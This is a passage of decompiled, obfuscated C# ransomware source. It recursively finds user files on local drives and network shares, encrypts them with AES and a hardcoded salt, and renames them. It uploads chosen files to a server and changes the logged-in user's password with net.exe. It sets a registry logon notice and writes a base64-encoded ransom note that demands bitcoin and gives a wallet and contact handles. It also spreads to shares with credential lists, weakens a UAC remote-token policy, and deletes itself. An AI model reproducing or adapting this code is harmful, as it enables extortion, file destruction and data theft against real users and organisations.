					goto IL_00b4;
				}
			}
			catch
			{
			}
			continue;
			IL_00b4:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains("autoexec.bat") && !fileInfo.FullName.Contains("desktop.ini") && !fileInfo.FullName.Contains("autorun.inf") && !fileInfo.FullName.Contains("ntuser.dat") && !fileInfo.FullName.Contains("iconcache.db") && !fileInfo.FullName.Contains("bootsect.bak") && !fileInfo.FullName.Contains("boot.ini") && !fileInfo.FullName.Contains("ntuser.dat.log") && !fileInfo.FullName.Contains("thumbs.db") && !fileInfo.FullName.ToLower().Contains("bootmgr") && !fileInfo.FullName.ToLower().Contains("pagefile.sys") && !fileInfo.FullName.ToLower().Contains("config.sys") && !fileInfo.FullName.ToLower().Contains("ntuser.ini") && !fileInfo.FullName.Contains(tRvIdsqgaYol("QnVpbGRlcl9Mb2c=")) && !fileInfo.FullName.Contains("RSAKeys") && !fileInfo.FullName.Contains("RECOVERY_FILES") && !fileInfo.FullName.EndsWith(".locked") && !fileInfo.FullName.EndsWith("exe") && !fileInfo.FullName.EndsWith("dll") && !fileInfo.FullName.EndsWith("EXE") && !fileInfo.FullName.EndsWith("DLL") && !fileInfo.FullName.Contains("Recycle.Bin") && !fileInfo.FullName.Contains(hyxqjtznsfKrwU))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(pjQSJFkSbPitugtC) * 1024.0 * 1024.0 && mPFeTlWiYmzyc == "YES")
						{
							list.Add(fileInfo.FullName);
							EFgMjDOmLMLGcj(list, rVufDDPSQKQ, DPEEeVouCFnU, kztnzpFoYtEyKGD, CtpZupuhdiOkGq);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && mPFeTlWiYmzyc == "NO")
						{
							list.Add(fileInfo.FullName);
							EFgMjDOmLMLGcj(list, rVufDDPSQKQ, DPEEeVouCFnU, kztnzpFoYtEyKGD, CtpZupuhdiOkGq);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			string[] array3 = directories;
			foreach (string item in array3)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static List<string> QfJKmqAhFvGohl(string vpJSROnYuR)
	{
		List<string> list = new List<string>();
		DirectoryInfo directoryInfo = new DirectoryInfo(vpJSROnYuR);
		try
		{
			foreach (FileInfo item in directoryInfo.EnumerateFiles())
			{
				try
				{
					if (!item.FullName.ToLower().Contains("program files") && !item.FullName.ToLower().Contains("windows") && !item.FullName.ToLower().Contains("perflogs") && !item.FullName.ToLower().Contains("internet explorer") && !item.FullName.ToLower().Contains("programdata") && !item.FullName.ToLower().Contains("appdata") && !item.FullName.ToLower().Contains("autoexec.bat") && !item.FullName.ToLower().Contains("desktop.ini") && !item.FullName.ToLower().Contains("autorun.inf") && !item.FullName.ToLower().Contains("ntuser.dat") && !item.FullName.ToLower().Contains("iconcache.db") && !item.FullName.ToLower().Contains("bootsect.bak") && !item.FullName.ToLower().Contains("boot.ini") && !item.FullName.ToLower().Contains("ntuser.dat.log") && !item.FullName.ToLower().Contains("thumbs.db") && !item.FullName.ToLower().Contains("bootmgr") && !item.FullName.ToLower().Contains("pagefile.sys") && !item.FullName.ToLower().Contains("config.sys") && !item.FullName.ToLower().Contains("ntuser.ini") && !item.FullName.Contains(tRvIdsqgaYol("QnVpbGRlcl9Mb2c=")) && !item.FullName.Contains("RSAKeys") && !item.FullName.Contains("RECOVERY_FILES") && !item.FullName.EndsWith(".locked") && !item.FullName.EndsWith("exe") && !item.FullName.EndsWith("dll"))
					{
						if (File.Exists(item.FullName) && (double)item.Length <= double.Parse(pjQSJFkSbPitugtC) * 1024.0 * 1024.0 && mPFeTlWiYmzyc == "YES")
						{
							list.Add(item.FullName);
						}
						else if (File.Exists(item.FullName) && mPFeTlWiYmzyc == "NO")
						{
							list.Add(item.FullName);
						}
					}
				}
				catch (UnauthorizedAccessException)
				{
				}
				catch
				{
				}
			}
			foreach (DirectoryInfo item2 in directoryInfo.EnumerateDirectories("*"))
			{
				if (directoryInfo.FullName.ToLower().Contains("program files") || directoryInfo.FullName.ToLower().Contains("windows") || directoryInfo.FullName.ToLower().Contains("perflogs") || directoryInfo.FullName.ToLower().Contains("internet explorer") || directoryInfo.FullName.ToLower().Contains("programdata") || directoryInfo.FullName.ToLower().Contains("appdata"))
				{
					continue;
				}
				try
				{
					foreach (FileInfo item3 in item2.EnumerateFiles("*", SearchOption.AllDirectories))
					{
						try
						{
							if (!item3.FullName.ToLower().Contains("autoexec.bat") && !item3.FullName.ToLower().Contains("desktop.ini") && !item3.FullName.ToLower().Contains("autorun.inf") && !item3.FullName.ToLower().Contains("ntuser.dat") && !item3.FullName.ToLower().Contains("iconcache.db") && !item3.FullName.ToLower().Contains("bootsect.bak") && !item3.FullName.ToLower().Contains("boot.ini") && !item3.FullName.ToLower().Contains("ntuser.dat.log") && !item3.FullName.ToLower().Contains("thumbs.db") && !item3.FullName.ToLower().Contains("bootmgr") && !item3.FullName.ToLower().Contains("pagefile.sys") && !item3.FullName.ToLower().Contains("config.sys") && !item3.FullName.ToLower().Contains("ntuser.ini") && !item3.FullName.Contains(tRvIdsqgaYol("QnVpbGRlcl9Mb2c=")) && !item3.FullName.Contains("RSAKeys") && !item3.FullName.Contains("RECOVERY_FILES") && !item3.FullName.EndsWith(".locked") && !item3.FullName.EndsWith("exe") && !item3.FullName.EndsWith("dll"))
							{
								if (File.Exists(item3.FullName) && (double)item3.Length <= double.Parse(pjQSJFkSbPitugtC) * 1024.0 * 1024.0 && mPFeTlWiYmzyc == "YES")
								{
									list.Add(item3.FullName);
								}
								else if (File.Exists(item3.FullName) && mPFeTlWiYmzyc == "NO")
								{
									list.Add(item3.FullName);
								}
							}
						}
						catch (UnauthorizedAccessException)
						{
						}
						catch
						{
						}
					}
				}
				catch (UnauthorizedAccessException)
				{
				}
				catch
				{
				}
			}
			return list;
		}
		catch (DirectoryNotFoundException)
		{
			return list;
		}
		catch (UnauthorizedAccessException)
		{
			return list;
		}
		catch (PathTooLongException)
		{
			return list;
		}
		catch
		{
			return list;
		}
	}

	public static string wRzEVCtsszv(string FhRoGbhPUddXP = "", string XaAGDadjjOsvx = "")
	{
		string result = "";
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = FhRoGbhPUddXP,
				Arguments = XaAGDadjjOsvx,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static void vayuAHRHzp(string VRqyUefGoHmEZ)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = "powershell",
			Arguments = VRqyUefGoHmEZ,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string vraAciSVuso(string azxeXrDukKC)
	{
		char[] array = azxeXrDukKC.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string tRvIdsqgaYol(string MXjnkJGsidA)
	{
		byte[] bytes = Convert.FromBase64String(MXjnkJGsidA);
		return Encoding.UTF8.GetString(bytes);
	}

	public static void eIjJSwCeGPWmD(string wuHZnUxZvon = "", string bwmGfGTDTVd = "SW5mb3JtYXRpb24uLi4=", string gOeTWCLxdvaS = "QWxsIHlvdXIgZmlsZXMgd2VyZSBlbmNyeXB0ZWQsIGlmIHlvdSB3YW50IHRvIGdldCB0aGVtIGFsbCBiYWNrLCBwbGVhc2UgY2FyZWZ1bGx5IHJlYWQgdGhlIHRleHQgbm90ZSBsb2NhdGVkIGluIHlvdXIgZGVza3RvcC4uLg==")
	{
		wuHZnUxZvon = vraAciSVuso("=42bn9Gbul2Vc52bpNnclZFduVmcyV3QcRlTgM3dvRmbpdFX0Z2bz9mcjlWTcVkUBdFVG90U");
		RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(tRvIdsqgaYol(wuHZnUxZvon), writable: true);
		if (registryKey != null)
		{
			registryKey.SetValue(tRvIdsqgaYol("TGVnYWxOb3RpY2VDYXB0aW9u"), tRvIdsqgaYol(bwmGfGTDTVd));
			registryKey.SetValue(tRvIdsqgaYol("TGVnYWxOb3RpY2VUZXh0"), tRvIdsqgaYol(gOeTWCLxdvaS));
			registryKey.Close();
		}
	}

	public static void AREPahaRXZVb()
	{
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				if (MJxeIPcrbE == "YES" && !string.IsNullOrEmpty(OIPPAJLKoE) && !string.IsNullOrEmpty(ruMxPpWxiDaDaN))
				{
					eIjJSwCeGPWmD("", OIPPAJLKoE, ruMxPpWxiDaDaN);
				}
				else
				{
					eIjJSwCeGPWmD();
				}
			}
		}
		catch
		{
		}
	}

	public static void PHzbXoGcleR(string ZjKRrIUWrbcP = "SW5mb3JtYXRpb24uLi4=", string nRcrByhHQUikJd = "QWxsIHlvdXIgZmlsZXMgd2VyZSBlbmNyeXB0ZWQsIGlmIHlvdSB3YW50IHRvIGdldCB0aGVtIGFsbCBiYWNrLCBwbGVhc2UgY2FyZWZ1bGx5IHJlYWQgdGhlIHRleHQgbm90ZSBsb2NhdGVkIGluIHlvdXIgZGVza3RvcC4uLg==")
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		NotifyIcon val = new NotifyIcon();
		val.set_Icon(SystemIcons.get_Warning());
		val.set_Visible(true);
		val.set_BalloonTipIcon((ToolTipIcon)2);
		val.set_BalloonTipTitle(tRvIdsqgaYol(ZjKRrIUWrbcP));
		val.set_BalloonTipText(tRvIdsqgaYol(nRcrByhHQUikJd));
		val.ShowBalloonTip(30000);
	}

	public static void WquuTgaNFfMh(string yicLVvZskbTtx)
	{
		string text = WindowsIdentity.GetCurrent().Name.Split(new char[1] { '\\' })[1].ToString();
		wRzEVCtsszv("net.exe", "user " + text + " " + yicLVvZskbTtx);
	}

	private static void MSpdPfaUgkT()
	{
		//IL_02db: Unknown result type (might be due to invalid IL or missing references)
		//IL_02e2: Expected O, but got Unknown
		//IL_02fd: Unknown result type (might be due to invalid IL or missing references)
		//IL_0304: Expected O, but got Unknown
		RTAgHQTZSwgUsR = OHkFEexVuUw.SHDOzwCXjD();
		List<QJmUvpITudv> list = QJmUvpITudv.IgPFocqsdeuvm();
		foreach (QJmUvpITudv item in list)
		{
			kGkgAJTDjCeUgewp.Add(item.EGtKxHcFbndVxtw);
		}
		XqIzlcdHQsHhv = RTAgHQTZSwgUsR.Union(kGkgAJTDjCeUgewp).ToList();
		foreach (string item2 in XqIzlcdHQsHhv)
		{
			if ((!item2.StartsWith("10.") && !item2.StartsWith("172.16.") && !item2.StartsWith("192.168.") && !item2.StartsWith("")) || !OHkFEexVuUw.mDPuHMAGlgFl(item2))
			{
				continue;
			}
			try
			{
				if (itFjiDWqgS == "YES")
				{
					for (int i = 0; i < OHkFEexVuUw.jDwGtVhXUPsIz.Count; i++)
					{
						wRzEVCtsszv("net.exe", "use \\\\" + item2 + " /USER:" + OHkFEexVuUw.jDwGtVhXUPsIz[i] + " " + OHkFEexVuUw.aZynqOsBPXCcPN[i]);
					}
				}
				else
				{
					wRzEVCtsszv("net.exe", "use \\\\" + item2);
				}
			}
			catch
			{
			}
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			try
			{
				string mXjnkJGsidA = vraAciSVuso("tVGdzl3UcNXZpNWas9GUc52bpNnclZFduVmcyV3QcN3dvRmbpdFX0Z2bz9mcjlWTcVkUBdFVG90U");
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(tRvIdsqgaYol(mXjnkJGsidA), writable: true);
				if (registryKey != null)
				{
					registryKey.SetValue(tRvIdsqgaYol("TG9jYWxBY2NvdW50VG9rZW5GaWx0ZXJQb2xpY3k="), 1, RegistryValueKind.DWord);
					registryKey.SetValue(tRvIdsqgaYol("RW5hYmxlTGlua2VkQ29ubmVjdGlvbnM="), 1, RegistryValueKind.DWord);
					registryKey.Close();
				}
			}
			catch
			{
			}
		}
		if (xiRqXSDLLeD == "YES")
		{
			try
			{
				string text = Path.GetTempFileName().Replace(".tmp", ".bat");
				File.WriteAllText(text, tRvIdsqgaYol("bW91bnR2b2wgfCBmaW5kICJ9XCIgPiB2LnR4dAoKKEZvciAvRiAlJWkgSW4gKHYudHh0KSBEbyAoCiAgICAgIFNldCBmcmVlZHJpdmU9MAogICAgICBGT1IgJSVkIElOIChDIEQgRSBGIEcgSCBJIEogSyBMIE0gTiBPIFAgUSBSIFMgVCBVIFYgVyBYIFkgWikgRE8gKAogICAgICAgICAgICBJRiBOT1QgRVhJU1QgJSVkOlwgKAogICAgICAgICAgICAgICAgICBJRiAiIWZyZWVkcml2ZSEiPT0iMCIgKAogICAgICAgICAgICAgICAgICAgICAgICBTZXQgZnJlZWRyaXZlPSUlZAogICAgICAgICAgICAgICAgICApCiAgICAgICAgICAgICkKICAgICAgKQogICAgICBtb3VudHZvbCAhZnJlZWRyaXZlITogJSVpCiAgICAgIHBpbmcgLW4gMiAxMjcuMC4wLjEKKSkKU2V0IGRyaXZlaWQ9MApGT1IgJSVkIElOIChDIEQgRSBGIEcgSCBJIEogSyBMIE0gTiBPIFAgUSBSIFMgVCBVIFYgVyBYIFkgWikgRE8gKAogICAgICBJRiBFWElTVCAlJWQ6XCAoCiAgICAgICAgICAgIFNldCAvYSBkcml2ZWlkKz0xCiAgICAgICAgICAgIGVjaG8gXjxTaGFyZWRGb2xkZXIgbmFtZT0iIWRyaXZlaWQhIiBob3N0UGF0aD0iJSVkOlwiIHdyaXRhYmxlPSJ0cnVlIi9ePiA+PnNmLnR4dAogICAgICAgICAp"), Encoding.ASCII);
				wRzEVCtsszv("cmd.exe", "/C " + text);
				if (File.Exists(text))
				{
					File.Delete(text);
				}
				if (File.Exists(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), "v.txt")))
				{
					File.Delete(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), "v.txt"));
				}
				if (File.Exists(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), "sf.txt")))
				{
					File.Delete(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), "sf.txt"));
				}
			}
			catch
			{
			}
		}
		ManagementObjectSearcher val = new ManagementObjectSearcher("select * from Win32_NetworkConnection");
		ManagementObjectEnumerator enumerator3 = val.Get().GetEnumerator();
		try
		{
			while (enumerator3.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator3.get_Current();
				if (!QbQwqgeXjhPl.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace("\\\\", "\\").Replace("\\\\\\\\", "\\\\")
					.Replace("\"", "")
					.Split(new char[1] { '(' })[0].Trim()))
				{
					QbQwqgeXjhPl.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace("\\\\", "\\").Replace("\\\\\\\\", "\\\\")
						.Replace("\"", "")
						.Split(new char[1] { '(' })[0].Trim());
				}
			}
		}
		finally
		{
			((IDisposable)enumerator3)?.Dispose();
		}
	}

	public static bool OLxYldnGupA()
	{
		WebRequest webRequest = WebRequest.Create("https://www.google.com/");
		try
		{
			webRequest.GetResponse();
		}
		catch
		{
			return false;
		}
		return true;
	}

	public static void dBJeYmPfKaJT()
	{
		wRzEVCtsszv("cmd.exe", tRvIdsqgaYol("L0MgcGluZyAxMjcuMC4wLjcgLW4gMyA+IE51bCAmIGZzdXRpbCBmaWxlIHNldFplcm9EYXRhIG9mZnNldD0wIGxlbmd0aD01MjQyODgg4oCcJXPigJ0gJiBEZWwgL2YgL3Eg4oCcJXPigJ0="));
		string text = tRvIdsqgaYol("L0MgY2hvaWNlIC9DIFkgL04gL0QgWSAvVCAzICYgRGVsIA==");
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = "\"" + text + "\"" + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = "cmd.exe";
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static void QscgpGQBiZo(string LkmBjTEBmbAcg)
	{
		try
		{
			FileAttributes attributes = File.GetAttributes(LkmBjTEBmbAcg);
			if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(LkmBjTEBmbAcg, attributes & ~FileAttributes.ReadOnly);
			}
		}
		catch
		{
		}
	}

	public static string OACjvwclUmb(string xAfzoRVYXnuc)
	{
		string text = Path.GetTempPath() + "\\RECOVERY_FILES.txt";
		if (!File.Exists(text))
		{
			using (StreamWriter streamWriter = new StreamWriter(text))
			{
				streamWriter.WriteLine(tRvIdsqgaYol("QWxsIGZpbGVzIGFyZSBlbmNyeXBlZCBhbmQgdXBsb2FkZWQgdG8gYSBzZXJ2ZXIuDQoNClRvIGF2b2lkICBsb29zZSBhbnkgb2YgeW91ciBmaWxlcyBhbmQgbGVha3MuIFBsZWFzZSBmb2xsb3cgaW5zdHJ1Y3Rpb25zLg0KDQpQYXltZW50IG9mIDAuMDUgQlRDIHRvIHRoZSBhZHJlc3MgdW5kZXJuZWF0aA0KDQpZb3UgY2FuIGJ1eSBiaXRjb2luIGhlcmU6DQoNCmxpdGViaXQuZXUNCmJpdG9uaWMubmwNCg0KQlRDIEFkcmVzczoNCg0KMUNOWm90a3ZMZ2hFUkM4eGNRSE1kdG51c0Jib0hERmdoeA0KDQpBZnRlciBwYXltZW50IGNvbnRhY3QgbWUgb24gbXkgbWFpbCBvciB0ZWxlZ3JhbS4NCg0KQ29udGFjdDogdGhlX3VuZGVydGFrZXI2MEBwcm90b25tYWlsLmNvbQ0KVGVsZWdyYW06IHRoZV91bmRlcnRha2VyNjA="));
				streamWriter.WriteLine("\r\n");
				streamWriter.WriteLine(tRvIdsqgaYol("S2V5IElkZW50aWZpZXI6IA=="));
				streamWriter.WriteLine(xAfzoRVYXnuc);
				return text;
			}
		}
		File.AppendAllText(text, "\r\nAditional KeyId:\r\n" + xAfzoRVYXnuc);
		return text;
	}

	public static void kHHiCvJMeWBK(string YNhkklUcJjm, string mtZhppOGlEonm)
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + YNhkklUcJjm + ".url");
		streamWriter.WriteLine("[Summary]");
		streamWriter.WriteLine("URL=file:///" + mtZhppOGlEonm);
		streamWriter.WriteLine("IconIndex=0");
		string text = mtZhppOGlEonm.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text);
	}

	private static void uWDwsznMJad(string[] BVMMyFWVIPxI, string[] pIhpNFVUEPLmMim, string[] vizOcttUTjAkAGF, string YYVdXnoVPKQ, string fWyReVTLCJNP)
	{
		GZKrWxkSqjStYqoQ = Encoding.ASCII.GetBytes(YYVdXnoVPKQ);
		DriveInfo[] array = null;
		if (BVMMyFWVIPxI[0] == "[auto]")
		{
			try
			{
				array = DriveInfo.GetDrives();
			}
			catch (Exception)
			{
			}
			if (array.Length > 0)
			{
				for (int i = 0; i < array.Length; i++)
				{
					if (array[i].IsReady && array[i].DriveType != DriveType.CDRom && !QbQwqgeXjhPl.Contains(array[i].Name))
					{
						QbQwqgeXjhPl.Add(array[i].Name);
					}
				}
			}
		}
		else
		{
			for (int j = 0; j < BVMMyFWVIPxI.Length; j++)
			{
				if (!QbQwqgeXjhPl.Contains(BVMMyFWVIPxI[j]))
				{
					QbQwqgeXjhPl.Add(BVMMyFWVIPxI[j]);
				}
			}
		}
		if (QbQwqgeXjhPl.Contains(tRvIdsqgaYol("Qzpc")) && RoXIZDFvccqVq == "YES")
		{
			QbQwqgeXjhPl.Remove(tRvIdsqgaYol("Qzpc"));
		}
		foreach (string IMOvhxnvGimrHd in QbQwqgeXjhPl)
		{
			if (fWvfvRzLwhw == "YES")
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					GtCuHLfKarhCPsD(IMOvhxnvGimrHd, pIhpNFVUEPLmMim, fWyReVTLCJNP, vizOcttUTjAkAGF, YYVdXnoVPKQ);
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = false;
				thread.Start();
				thread.Join();
			}
			else
			{
				GtCuHLfKarhCPsD(IMOvhxnvGimrHd, pIhpNFVUEPLmMim, fWyReVTLCJNP, vizOcttUTjAkAGF, YYVdXnoVPKQ);
			}
		}
	}

	public static void GtCuHLfKarhCPsD(string HSKeRwogatKBbfq, string[] ShrKLgcEKf, string IpzZsuzaViNYydX, string[] FDoXjJrlNXs, string DKeBhRFsDmc)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add("");
		List<string> list3 = list2;
		if (HedkgVXHnX == "NO")
		{
			list = HxHYEVqAvVuJvTvN(HSKeRwogatKBbfq, ShrKLgcEKf, IpzZsuzaViNYydX, FDoXjJrlNXs, DKeBhRFsDmc);
			return;
		}
		list = YVEcUYlJrkB.SearchFiles(HSKeRwogatKBbfq);
		foreach (string text in ShrKLgcEKf)
		{
			foreach (string item in list)
			{
				if (FDoXjJrlNXs.Length != 0)
				{
					int num = 0;
					while (num < FDoXjJrlNXs.Length)
					{
						string value = FDoXjJrlNXs[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_02f1;
					}
				}
				if ((uLOfmffuUbO == "NO" && !item.EndsWith(text)) || PhPfWbXuhz.Contains(item))
				{
					continue;
				}
				if (xBPdwqHHEeht == "YES")
				{
					try
					{
						if (wFOcxFWrvvhtV.HfQhZOaQmZ(item))
						{
							wFOcxFWrvvhtV.DqAiciqTVTQ(item);
						}
					}
					catch
					{
					}
				}
				PhPfWbXuhz.Add(item);
				if (!CXucXEXIeDykT.Contains(Path.GetDirectoryName(item)))
				{
					CXucXEXIeDykT.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (jxOoqhbcgtBZFv == "YES" && fileStream.Length > Convert.ToInt32(qVisayOOulGyyq) * 1024 * 1024 && !list3.Contains(text))
					{
						if (ZwDUufGDCysrvCb == "YES")
						{
							foreach (string item2 in jjGwgfQeXEgM)
							{
								if (item.ToLower().EndsWith(item2) && SJciSWANwLpZd == "YES")
								{
									if (Convert.ToInt32(XyJXNRlVrpoE) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											FFdxwtHSrgOu.WMaZYGtgQwWMld("URL", "USERNAME", "ACCESO", item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && SJciSWANwLpZd == "NO")
								{
									try
									{
										FFdxwtHSrgOu.WMaZYGtgQwWMld("URL", "USERNAME", "ACCESO", item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] kionDwaKOxROt = GTRtlZMjZZbcvl.SYxHOqaALSG(item, Convert.ToInt32(qVisayOOulGyyq) * 1024 * 1024);
						byte[] guOBwaFgYVP = GTRtlZMjZZbcvl.uLcsZkADwbGAt(kionDwaKOxROt, Encoding.ASCII.GetBytes(DKeBhRFsDmc), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						GTRtlZMjZZbcvl.XzYjQpMihHQzL(item, guOBwaFgYVP);
						if (IpzZsuzaViNYydX != ".*")
						{
							File.Move(item, item + IpzZsuzaViNYydX);
						}
					}
					else if (IpzZsuzaViNYydX != ".*")
					{
						bfnPunVNsGmm(item, item + IpzZsuzaViNYydX, GZKrWxkSqjStYqoQ);
					}
					else
					{
						bfnPunVNsGmm(item, item + ".part", GZKrWxkSqjStYqoQ);
					}
				}
				catch (Exception)
				{
				}
				IL_02f1:;
			}
		}
	}

	public static void EFgMjDOmLMLGcj(List<string> SdJskvfDISabYei, string[] dPkxqWPddYpCtJy, string oinIQSNyLyYhIwmcG, string[] flwIEZNtUvYHEiKMf, string dYsbXNESSFhJ)
	{
		List<string> WfIOVtmLPIN = new List<string> { "" };
		Parallel.ForEach(dPkxqWPddYpCtJy, delegate(string t1)
		{
			foreach (string item in SdJskvfDISabYei)
			{
				if (flwIEZNtUvYHEiKMf.Length != 0)
				{
					string[] array = flwIEZNtUvYHEiKMf;
					int num = 0;
					while (num < array.Length)
					{
						string value = array[num];
						string text = item.ToLower();
						if (!text.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_0336;
					}
				}
				if (uLOfmffuUbO == "NO")
				{
					string text2 = item.ToLower();
					if (!text2.EndsWith(t1))
					{
						continue;
					}
				}
				if (!PhPfWbXuhz.Contains(item))
				{
					if (xBPdwqHHEeht == "YES")
					{
						try
						{
							if (wFOcxFWrvvhtV.HfQhZOaQmZ(item))
							{
								wFOcxFWrvvhtV.DqAiciqTVTQ(item);
							}
						}
						catch
						{
						}
					}
					PhPfWbXuhz.Add(item);
					if (!CXucXEXIeDykT.Contains(Path.GetDirectoryName(item)))
					{
						CXucXEXIeDykT.Add(Path.GetDirectoryName(item));
					}
					QscgpGQBiZo(item);
					try
					{
						try
						{
							if (new FileInfo(item).Length != 0L)
							{
								goto end_IL_00e8;
							}
							goto end_IL_00e8_2;
							end_IL_00e8:;
						}
						catch (Exception)
						{
							goto end_IL_00e8_2;
						}
						FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						if (jxOoqhbcgtBZFv == "YES" && fileStream.Length > Convert.ToInt32(qVisayOOulGyyq) * 1024 * 1024 && !WfIOVtmLPIN.Contains(t1))
						{
							if (ZwDUufGDCysrvCb == "YES")
							{
								foreach (string item2 in jjGwgfQeXEgM)
								{
									if (item.ToLower().EndsWith(item2) && SJciSWANwLpZd == "YES")
									{
										if (Convert.ToInt32(XyJXNRlVrpoE) * 1024 * 1024 > fileStream.Length)
										{
											try
											{
												FFdxwtHSrgOu.WMaZYGtgQwWMld("URL", "USERNAME", "ACCESO", item);
											}
											catch
											{
											}
										}
									}
									else if (item.ToLower().EndsWith(item2) && SJciSWANwLpZd == "NO")
									{
										try
										{
											FFdxwtHSrgOu.WMaZYGtgQwWMld("URL", "USERNAME", "ACCESO", item);
										}
										catch
										{
										}
									}
								}
							}
							fileStream.Dispose();
							byte[] array2 = null;
							byte[] array3 = GTRtlZMjZZbcvl.SYxHOqaALSG(item, Convert.ToInt32(qVisayOOulGyyq) * 1024 * 1024);
							array2 = (nXWsyPPQaMQrM ? aczLAIFWowAUpL.OoFqzHyRFT(array3, Encoding.ASCII.GetBytes(dYsbXNESSFhJ), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : GTRtlZMjZZbcvl.uLcsZkADwbGAt(array3, Encoding.ASCII.GetBytes(dYsbXNESSFhJ), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }));
							GTRtlZMjZZbcvl.XzYjQpMihHQzL(item, array2);
							if (oinIQSNyLyYhIwmcG != ".*")
							{
								File.Move(item, item + oinIQSNyLyYhIwmcG);
							}
						}
						else if (oinIQSNyLyYhIwmcG != ".*")
						{
							AUkxAhDnruHDH(item, item + oinIQSNyLyYhIwmcG, GZKrWxkSqjStYqoQ);
						}
						else
						{
							AUkxAhDnruHDH(item, item + ".part", GZKrWxkSqjStYqoQ);
						}
						end_IL_00e8_2:;
					}
					catch (Exception)
					{
					}
				}
				IL_0336:;
			}
		});
	}

	private static void bfnPunVNsGmm(string fmRPRdeKzRFuY, string wqfOkilIvNmf, byte[] CgnCOSCwauZn)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(wqfOkilIvNmf, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(CgnCOSCwauZn, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(fmRPRdeKzRFuY, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (wqfOkilIvNmf.Length > 0)
				{
					FileStream fileStream3 = new FileStream(fmRPRdeKzRFuY, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (ZwDUufGDCysrvCb == "YES")
					{
						foreach (string item in jjGwgfQeXEgM)
						{
							if (fmRPRdeKzRFuY.ToLower().EndsWith(item) && SJciSWANwLpZd == "YES")
							{
								if (Convert.ToInt32(XyJXNRlVrpoE) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										FFdxwtHSrgOu.WMaZYGtgQwWMld("URL", "USERNAME", "ACCESO", fmRPRdeKzRFuY);
									}
									catch
									{
									}
								}
							}
							else if (fmRPRdeKzRFuY.ToLower().EndsWith(item) && SJciSWANwLpZd == "NO")
							{
								try
								{
